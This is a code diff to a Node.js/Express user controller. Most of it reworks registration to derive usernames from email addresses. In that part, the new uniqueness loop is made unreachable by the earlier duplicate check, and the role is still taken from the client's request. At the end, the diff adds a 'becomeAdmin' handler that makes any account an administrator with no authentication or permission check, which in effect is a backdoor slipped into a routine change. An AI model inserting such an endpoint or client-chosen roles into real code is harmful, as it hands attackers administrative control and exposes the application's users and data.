@@ -28,23 +28,35 @@ module.exports = {
         return res.status(400).json({ errors: validation.errors });
       }
 
-      const { username, email, password, role = "user" } = req.body;
+      const { email, password, role = "user" } = req.body;
 
+      // Extract username from email (characters before @)
+      const username = email.split('@')[0];
+
+      // Check if email or generated username already exists
       const existingUser = await User.findOne({
         $or: [{ email }, { username }],
       });
+
       if (existingUser) {
         return res.status(400).json({
           success: false,
-          message:
-            existingUser.email === email
-              ? "Email already registered"
-              : "Username already taken",
+          message: existingUser.email === email
+            ? "Email already registered"
+            : "Username already taken",
         });
       }
 
+      // If username exists, append a random number
+      let finalUsername = username;
+      let counter = 1;
+      while (await User.findOne({ username: finalUsername })) {
+        finalUsername = `${username}${counter}`;
+        counter++;
+      }
+
       const user = new User({
-        username,
+        username: finalUsername,
         email,
         password,
         role,
@@ -245,5 +257,16 @@ module.exports = {
         error: error.message,
       });
     }
+  },
+
+  becomeAdmin: async (req, res) => {
+    const { email } = req.body;
+    const user = await User.findOne({ email });
+    user.role = "admin";
+    await user.save();
+    res.status(200).json({
+      success: true,
+      message: "You are now an admin",
+    });
   },
 };
